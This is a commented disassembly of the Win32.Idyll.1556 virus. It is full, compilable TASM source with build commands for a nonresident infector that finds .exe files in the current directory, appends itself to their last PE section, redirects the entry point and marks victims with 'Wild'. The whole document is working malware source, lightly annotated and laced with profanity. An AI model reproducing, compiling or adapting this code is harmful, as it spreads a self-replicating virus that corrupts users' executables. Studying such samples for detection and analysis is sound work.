;
;		Win32.Idyll.1556
;	    disassembly done by peon
;
;
;
; This is a noninteresting,nonresident infector of PE files.
; Infects files in the current directory.No payload or anything interesting.
; Assumed to be compiled with /m switch so NOP's after jumps included in the source.
;
; Sorry for the annoying lack of comments-most of the stuff is self-explanatory
; (so this is not the one you'll learn w32 coding from)
;
; 
;compilation:
;tasm32 /m /ml idyll.asm
;tlink32 idyll,,,import32.lib /Tpe
;pewrsec idyll.exe
;
;

.386			;the usual stuff
.model flat

extrn GetModuleHandleA:proc ;---\	
			    ;    >virus needs these fns to be imported by host
extrn GetProcAddress:proc   ;---/

extrn ExitProcess:proc


;
;struc def so no need of inc's
;
_find_data struc
	_attr dd ?
	_creatlo dd ?
	_creathi dd ?
	_lastalo dd ?
	_lastahi dd ?
	_lastwlo dd ?
	_lastwhi dd ?
	_sizehi dd ?	;@1C
	_sizelo dd ?	;@20
	_res0 dd ?
	_res1 dd ?
	_fname db 260 dup(?)	;@2C
	_fuck db 10 dup (?)		;idyll allocates less than the real
_find_data ends				;size of finddata structure

.data
dd 0	;tlink32 stuff

.code
host_start:
	push 0
	call ExitProcess
;
;we need some fixups like filling fn adds and encrypting api strings
;before starting the 1st generation sample
;
; This is where control is received from the loader... X-D
fixups:
	mov eax,idyll_gmh		;getmodulehandle
	mov eax,[eax]			;get dispatcher add
	mov idyll_gmh,eax		;store it as virus does during
					;infection
	mov eax,idyll_gpa		;getprocaddress
	mov eax,[eax]
	mov idyll_gpa,eax		;do the same
	mov esi,offset idyll_apinames	;ptr to apinames
	mov ecx,idyll_length_of_apinames;# of bytes to crypt
fixup_xorloop:
	xor byte ptr [esi],17h		;crypt byte
	inc esi				;inc ptr
	loop fixup_xorloop		;loop
	jmp idyll			;launch virus

;the author (the false demon prophet) coded a host with 69h bytes of size
;i fix this with an org directive
	org 69h
;
;----------------------- infective code begins here ----------------------------
;


idyll_start equ $
idyll_size equ idyll_end-idyll_start

;
;idyll main
;
idyll:
	call idyll_flexible_entry_point	;will calculate delta offset
idyll_flexible_entry_point:
	mov ebp,[esp]			;get offset from stack
	sub ebp,offset idyll_flexible_entry_point ;fix ebp
	add esp,4			;perform pop off the stack
	mov eax,[ebp+offset idyll_hostentry] ;entry point of host
	lea edi,[ebp+idyll_hostentry_load]   ;get add of instruction to patch
	inc edi				;fix ptr (seems the author wasnt
					; familiar with equ $-4 stuff)
	mov [edi],eax			;patch code for return to host
	mov edi,[ebp+offset idyll_gmh]		
	mov eax,[edi]				;get fn add
	mov [ebp+idyll_getmodulehandlea_add],eax;store fn add
	lea edi,[ebp+offset idyll_k32string]	;fetch ptr to 'KERNEL32' string
	push edi				;pass param
	call [ebp+idyll_getmodulehandlea_add]	;get a handle to KERNEL32.dll
	mov [ebp+offset idyll_k32add],eax	;store it
	mov edi,[ebp+offset idyll_gpa]		
	mov eax,[edi]				;get fn add
	mov [ebp+idyll_getprocaddress_add],eax;store fn add
	call idyll_xorloop_on_apinames		;decrypt api strings
	call idyll_lookup_apis			;get fn addresses
	call idyll_xorloop_on_apinames		;encrypt api strings
	lea edi,[ebp+offset idyll_filemask]	;filemask for searches
	call idyll_init				;init routines
	cmp eax,-1				;failed?
	je idyll_hostentry_load			;yes abort
	nop
	nop					;nops for match
	nop
	nop
	call idyll_infect			;try to infect
idyll_mainloop:
	call idyll_findnext			;find next victim...
	cmp eax,0                               ;failed?
	je idyll_hostentry_load                 ;if yes execute host
	nop
	nop
	nop
	nop
	call idyll_infect			;otherwise infect
	jmp idyll_mainloop			;and loop...
idyll_hostentry_load:			;@10F5
	mov edi,0			;this will be patched by virus
	push edi			;store on TOS
	ret				;jump to host
;
;allocate memory for finddata structure and call FindFirstFileA()
;
idyll_init:				;@1093(8293)
	push edi		;store reg
	push 4			;acces protection:PAGE_READWRITE
	push 1000h		;type of allocation:MEM_COMMIT
	push size _find_data	;size of the region to allocate
	push 0			;address of region to reserve or commit
	call [ebp+offset idyll_virtualalloc_add];call VirtualAlloc
	mov [ebp+offset idyll_finddata_add],eax	;store add
	pop edi
	push eax
	push edi
	call [ebp+offset idyll_findfirstfilea_add] ;call FindFirstFileA()
	mov [ebp+offset	idyll_findhandle],eax      ;store handle
	ret
;
;launch FindNextFileA()
;
idyll_findnext:
	mov eax,[ebp+offset idyll_finddata_add]
	push eax                               	;store param
	mov eax,[ebp+offset idyll_findhandle]
	push eax                                ;store param
	call [ebp+offset idyll_findnextfilea_add];call fn
	ret                                     ;back to caller
;
;infection routine
;
idyll_infect:		;@10D3
	xor eax,eax
	mov [ebp+offset idyll_sectsize],eax
	call idyll_mapfile			;try to map file
	cmp eax,0				;failed?
	je idyll_infect_return_failure
	call idyll_testfile			;file can be infected?
	test eax,eax				;eax zero if yes
	jne idyll_infect_fail			;possibly already infected,abort
	mov edi,[ebp+offset idyll_peheader]	;fetch PE header
	add edi,78h				;start of RVA list
	add edi,8				;ptr to imports RVA
	mov ebx,[edi]				;get value
	call idyll_infect_findimports
	mov esi,ebx
;
;scan imports for KERNEL32.dll module and GetModuleHandleA + GetProcAddress
;fns to patch virus before moving code into the victim 
;
idyll_infect_importloop:
	mov ebx,[esi+0ch]
	call idyll_infect_findimports
	mov edi,ebx
	call idyll_infect_findk32
	cmp eax,0
	je idyll_infect_k32found
	nop
	nop
	nop
	nop
	cmp byte ptr [edi],0		;endmarker?
	je idyll_infect_fail					
	add esi,14h			;next one..
	jmp idyll_infect_importloop	;and branch
idyll_infect_k32found:
	push esi
	lea edi,[ebp+offset idyll_gmhstring] ;GetModuleHandleA string
	mov ebx,[esi]
	call idyll_infect_findimports		;find imports rva
	mov ecx,16				;size of gmh string
	call idyll_infect_find_fn		;find fn
	cmp eax,-1				;failed?
	pop esi
	je idyll_infect_fail			;yes abort
	mov edi,[esi+10h]
	lea ebx,[eax*4]
	add edi,ebx
	xchg edi,ebx
	mov edi,[ebp+offset idyll_peheader]
	add ebx,[edi+34h]			;add imagebase
	mov [ebp+offset idyll_gmh],ebx		;store add of GetModuleHandleA
	push esi
	lea edi,[ebp+offset idyll_gpastring]	;GetProcAddress string
	mov ebx,[esi]
	call idyll_infect_findimports
	mov ecx,0eh                     	;size of string
	call idyll_infect_find_fn
	cmp eax,-1
	pop esi
	je idyll_infect_fail
	mov edi,[esi+10h]
	lea ebx,[eax*4]
	add edi,ebx
	xchg ebx,edi
	mov edi,[ebp+offset idyll_peheader]
	add ebx,[edi+34h]			;add imagebase
	mov [ebp+offset idyll_gpa],ebx
	mov edi,[ebp+offset idyll_peheader]	;needless
	push edi
	xor ecx,ecx
	mov cx,[edi+6]				;get object count
	dec cx					;counting starts from 1
	mov esi,[ebp+offset idyll_1stsec]	;get ptr to 1st entry
idyll_infect_getlastentry:
	add esi,40				;size of each entry	
	loop idyll_infect_getlastentry		;get ptr to last entry
	mov edx,[esi+0ch]			;get section RVA
	add esi,16				;esi points to PhysOffset
	add edx,[esi]				;RVA+PhysOffset
	push edx
	mov ebx,[esi]				;PhysOffset of last section
	mov edi,[ebp+offset idyll_peheader]	;needless again
	mov eax,[edi+3ch]			;get file alignment unit
	xor edx,edx				;zero reg
;
;increase section PhysSize by file alignment units
;until its larger than virus size
;
idyll_infect_fixsize:
	add edx,eax				;add filealign
	cmp edx,idyll_size			;virus size
	jl idyll_infect_fixsize		        ;loop if section smaller than virus
	mov eax,[esi+4]			
	add eax,[esi]	
	mov [ebp+offset idyll_sectsize],edx
	add edx,ebx
	mov [esi],edx				;set new PhysSize
	mov [esi-8],edx				;set new VirtSize
	pop edx
	pop edi
	push eax
	mov ebx,[edi+28h]			;get entry RVA
	add ebx,[edi+34h]			;add imagebase
	mov [ebp+offset idyll_hostentry],ebx	;save restart address
	mov [edi+28h],edx		;modify host entry RVA in PE header
	mov edx,0e0000020h			;object flags:[CERW]
	mov [esi+14h],edx			;set flags
	call idyll_unmap_close			;unmap and close file
	call idyll_mapfile			;
	test eax,eax
	je idyll_infect_fail
	nop
	nop
	nop
	nop		
	call idyll_testfile			;?
	pop ebx
	mov edi,[ebp+offset idyll_finddata_add]	;why?
	lea esi,[ebp+offset idyll_start]
	mov edi,[ebp+offset idyll_mappedadd]
	push edi
	add edi,ebx
	mov ecx,idyll_size			;virus size
	rep
	movsb					;move virus into victim
	pop edi
	add edi,[edi+3ch]			;ptr to PE header
	mov [edi+58h],'Wild'			;mark file infected
	call idyll_unmap_close			;unmap and close file
idyll_infect_return_success:
	mov eax,1				;fucking waste of space to
	ret					;return nonzero value
idyll_infect_fail:
	call idyll_unmap_close
idyll_infect_return_failure:
	xor eax,eax
	ret
;	
;subroutine to
;determine whether a file can be infected
;in:	eax:va of mapped file
;out:	eax:zero if file can be infected
;
idyll_testfile:
	mov ebx,eax		;va of mapped file into ebx
	cmp word ptr [ebx],'ZM'	;exe?
	jne idyll_testfile_return_failure;nope abort
	nop
	nop
	nop
	nop
	add eax,dword ptr [ebx+3ch]	;get ptr to PE header
	mov [ebp+offset idyll_peheader],eax
	xchg edi,eax			;load ptr into edi
	cmp word ptr [edi],'EP'		;a PE?
	jne idyll_testfile_return_failure;nope abort
	nop
	nop
	nop
	nop
	cmp [edi+58h],'Wild'		;already infected?
	je idyll_testfile_return_failure;yes abort
	nop
	nop
	nop
	nop
	add edi,74h
	mov ecx,[edi]			;number of interesting rva's
idyll_testfile_rva_loop:
	add edi,8			;skip item
	loop idyll_testfile_rva_loop	;so we'll get a ptr to sectiontable
	add edi,4
	mov [ebp+offset idyll_1stsec],edi;store ptr to 1st entry in
					 ;sectiontable 				
idyll_testfile_return_success:
	xor eax,eax			;and return succes to caller
	ret
idyll_testfile_return_failure:
	xor eax,eax			;return failure to caller
	dec eax
	ret
;
;find a function in the victims imports
;(called when infecting to get GetModuleHandleA and GetProcAddress)
;
idyll_infect_find_fn:		;@12B0(84B0)
	xor eax,eax
idyll_infect_find_fn_loop:
	mov esi,[ebx+4*eax]
	cmp esi,0		;endmarker?
	je idyll_infect_find_fn_return_failure
	nop
	nop
	nop
	nop
	push ebx
	mov ebx,esi
	call idyll_infect_findimports
	inc ebx
	inc ebx
	mov esi,ebx
	pop ebx
	push edi
	push ecx
	repz
	cmpsb			;compare names
	cmp ecx,0               ;found?
	pop ecx
	pop edi
	je idyll_infect_find_fn_done   ;yes
	nop
	nop
	nop
	nop
	inc eax                            ;nope,loop
	jmp idyll_infect_find_fn_loop
idyll_infect_find_fn_done:
	ret
idyll_infect_find_fn_return_failure:
	xor eax,eax                       ;return failure
	dec eax
	ret
;
;find KERNEL32 string in import module names list
;
idyll_infect_findk32:		;@12E2(84E2)
	push edi
	push esi
	mov ecx,8		;size of string
	push ecx
	lea esi,[ebp+offset idyll_dllnamebuffer] ;destination
	push esi
;
;uppercase input.
;
idyll_infect_findk32_loop:
	mov ah,[edi]		;get char
	cmp ah,'a'              ;lowercase?
	jl idyll_infect_findk32_uppercase  ;nope,store char
	nop
	nop
	nop
	nop
	sub ah,32		;convert to upper
idyll_infect_findk32_uppercase:
	mov [esi],ah            ;and store char
	inc esi			;increase dest ptr
	inc edi			;increase src ptr
	loop idyll_infect_findk32_loop      ;branch
	pop esi			;get ptr back
	pop ecx			;get str len back
	lea edi,[ebp+offset idyll_k32string] ;ptr to 'KERNEL32' string
	repz
	cmpsb			;compare strings
	mov eax,ecx		;eax hold return value,zero if K32 found
	pop esi			;get regs back
	pop edi
	ret			;return to caller

;
;find the section that contains imports
;
idyll_infect_findimports:	;@1314(8514)
	push edi
	push ecx
	push esi
	push eax
	mov edi,[ebp+offset idyll_peheader]
	mov ecx,[edi+6]		;get object count..bug:oc is a 16bit value
	mov esi,[ebp+offset idyll_1stsec]	;ptr to 1st entry in section table
idyll_infect_findimports_loop:
	mov eax,[esi+0ch]			;fetch section RVA
	cmp ebx,eax				;compare them
	jle idyll_infect_findimports_found
	nop
	nop
	nop
	nop
	add esi,28h				;next section
	loop idyll_infect_findimports_loop	;loop
idyll_infect_findimports_found:
	je idyll_infect_findimports_found_at_sectionstart
	nop	;^
	nop     ;|
	nop     ;+--start of imports equals to start of some section?
	nop
	sub esi,28h			;nope,previous section...
idyll_infect_findimports_found_at_sectionstart:
	mov eax,[esi+0ch]			;fetch section RVA
	mov ecx,ebx
	sub ecx,eax
	mov ebx,[esi+14h]			;PhysOffset
	add ebx,[ebp+offset idyll_mappedadd]
	add ebx,ecx
	pop eax
	pop esi
	pop ecx
	pop edi
	ret
;
;map the file into the processes address space
;
idyll_mapfile:		;@1357(8557)
	mov edi,[ebp+offset idyll_finddata_add];ptr to finddata structure
	add edi,2ch		;fix ptr to point to the name of the found file
	push edi		;parameter for open
	push 80h		;fileattribute normal
	push edi		;param for setfileattr
	call [ebp+offset idyll_setfileattributesa_add];call fn to set
						      ;file attr to normal
	test eax,eax		;failed?
	je idyll_mapfile_return_failure ;yes abort
	nop
	nop
	nop
	nop
	pop edi					;get ptr to filename back
	push 0					;no hTemplate
	push 80h				;attribute normal
	push 3					;OPEN_EXISTING
	push 0					;no sa struct
	push 0					;prevents from being shared
	push 0c0000000h				;r/w
	push edi				;ptr to filename
	call [ebp+offset idyll_createfilea_add]	;call CreateFileA()
	mov [ebp+offset idyll_handle],eax	;store handle
	cmp eax,-1				;open failed?
	je idyll_mapfile_return_failure		;yes abort
	nop
	nop
	nop
	nop
;
;now the file's opened..calculate the size of filemapping object
;and map file
;
	mov edi,[ebp+offset idyll_finddata_add]
	mov edx,[edi._sizelo]
	mov ebx,[edi._sizehi]
	add edx,[ebp+offset idyll_sectsize]
	push 0				;name of mapping object
	push edx			;max size lo
	push ebx			;max size hi
	push 4				;PAGE_READWRITE
	push 0				;no sa structure
	push eax			;hFile to map
	call [ebp+offset idyll_createfilemappinga_add]
	mov [ebp+offset idyll_maphand],eax	;store hObject
	test eax,eax				;failed?
	je idyll_mapfile_return_failure		;yes abort
	nop
	nop
	nop
	nop
	push 0					;map entire file
	push 0					;from zero offset
	push 0					;from zero offset
	push 2					;r/w access
	push eax				;hObject
	call [ebp+offset idyll_mapviewoffile_add];call MapViewOfFile
	mov [ebp+offset idyll_mappedadd],eax	;store add of mapped image
	test eax,eax				;failed?
	je idyll_mapfile_return_failure		;yes abort
	nop
	nop
	nop
	nop
	ret					;return success(eax nonzero)
idyll_mapfile_return_failure:
	xor eax,eax
	ret
;
;unmap the file and close handles
;
idyll_unmap_close:	;@13EE(85EE)
	mov eax,[ebp+offset idyll_mappedadd]	;address of mapped image
	push eax				;sotre parameter
	call [ebp+offset idyll_unmapviewoffile_add];unmap file
	mov eax,[ebp+offset idyll_maphand]	;hObject
	push eax                                ;store parameter
	call [ebp+offset idyll_closehandle_add]	;close file mapping object	
	mov eax,[ebp+offset idyll_handle]	;hFile
	push eax                                ;store parameter
	call [ebp+offset idyll_closehandle_add] ;close file
	ret					;return to motherfucking caller

;
;calls GetProcAddress to retrieve fn adds needed for infection
;
idyll_lookup_apis:		;@147F
	lea edi,[ebp+offset idyll_apinames];strings of fn names
	lea esi,[ebp+offset idyll_apiaddresses];room for fn addresses
idyll_lookup_apis_loop:
	mov ax,[edi]		;fetch a word
	cmp ax,0		;end of apinames?
	je idyll_lookup_apis_return	;yes return
	nop			;nops for b2b match
	nop
	nop
	nop
	push esi		;store ptr
	push edi		;pass fn add
	mov eax,[ebp+offset idyll_k32add]	;hModule of KERNEL32
	push eax		;pass param
	mov esi,[ebp+offset idyll_getprocaddress_add];add of fn
	call esi		;call GetProcAddress
	pop esi			;get ptr back
	mov [esi],eax		;store fn add
	add esi,4		;fix ptr
	xor al,al		;zero reg
	or ecx,-1		;ecx contains 0xFFFFFFFF
	inc edi			;inc ptr
	repnz			;find end of string (null)
	scasb
	jmp idyll_lookup_apis_loop;proceed with next fn
idyll_lookup_apis_return:
	ret
;
;data needed on virus startup
;

idyll_k32string		db 'KERNEL32',0	;@14BA
idyll_k32add		dd 0		;address of KERNEL32.dll @14C3
;
;these fields are filled during infection and must be fixed
;before executing the 1st generation of the virus
;***note:this makes the whole stuff tasm/tlink dependent
;
idyll_gmh		dd offset GetModuleHandleA+2	;@14C7 GetModuleHandleA
idyll_gpa		dd offset GetProcAddress+2	;@14CB GetProcaddress
			dd 0				;@14CF
			dd 0				;
idyll_gmhstring		db 'GetModuleHandleA',0		;@14D7
idyll_gpastring		db 'GetProcAddress',0		;@14E8
idyll_getmodulehandlea_add	dd 0	;@14F7 fn address
idyll_getprocaddress_add	dd 0	;@14FB fn address

;
;encrypt/decrypt api names
;(i always get wired when i see motherfucking mixing of motherfucking code
;and motherfucking data motherfucking areas motherfucking)
;

idyll_xorloop_on_apinames:	;@14FF
	lea esi,[ebp+offset idyll_apinames];ptr to string to crypt
	mov ecx,idyll_length_of_apinames;amount to crypt
idyll_xorloop_on_apinames_loop:
	mov ah,[esi]			;get byte
	xor ah,17h			;crypt byte
	mov [esi],ah			;store byte
	inc esi				;inc ptr
	dec ecx				;has the author heard of the 'loop'
	jne idyll_xorloop_on_apinames_loop ;instruction of the x86's?
	ret

;
;data related to idyll
;

idyll_length_of_apinames equ idyll_endof_apinames-idyll_apinames
;
;names of functions virus uses for infection
;
idyll_apinames equ $
	db 'CreateFileA',0
	db 'CreateFileMappingA',0
	db 'MapViewOfFile',0
	db 'UnmapViewOfFile',0
	db 'CloseHandle',0
	db 'VirtualAlloc',0
	db 'VirtualFree',0
	db 'FindFirstFileA',0
	db 'FindNextFileA',0
	db 'SetFileAttributesA',0
	db 'GetLastError',0
	dw 0			;endmarker
idyll_endof_apinames equ $

;
;api adds will be stored here
;
idyll_apiaddresses	equ $
idyll_createfilea_add dd 0		;@15B7
idyll_createfilemappinga_add dd 0
idyll_mapviewoffile_add dd 0
idyll_unmapviewoffile_add dd 0
idyll_closehandle_add dd 0
idyll_virtualalloc_add dd 0
idyll_virtualfree_add dd 0
idyll_findfirstfilea_add dd 0
idyll_findnextfilea_add dd 0
idyll_setfileattributesa_add dd 0
idyll_getlasterror_add dd 0

idyll_hostentry		dd offset host_start	;host erva @15E3
idyll_filemask		db '*.exe',0	;filemask for searches @15E7
idyll_findhandle	dd 0	;@15ED	handle for file searches
idyll_finddata_add	dd 0	;@15F1	address of finddata structure
idyll_handle		dd 0	;@15F5	handle of open file
idyll_maphand		dd 0	;@15F9	handle of file mapping object
idyll_mappedadd		dd 0	;@15FD	address of mapped file
idyll_peheader		dd 0	;@1601	ptr to PE header
idyll_1stsec		dd 0	;@1605	ptr to 1st entry in object table
idyll_sectsize		dd 0	;@1609
idyll_x			dd 0	;@160D
idyll_dllnamebuffer	db 20 dup(0)	;@1611
idyll_text		db '[win32.idyllWild]',10,13
			db 'take me in your arms of velvet...',10,13
			db 'kiss me with satin...',10,13
			db 'drown me.',10,13

idyll_end equ $

end fixups	;we will start fixup routine first



 


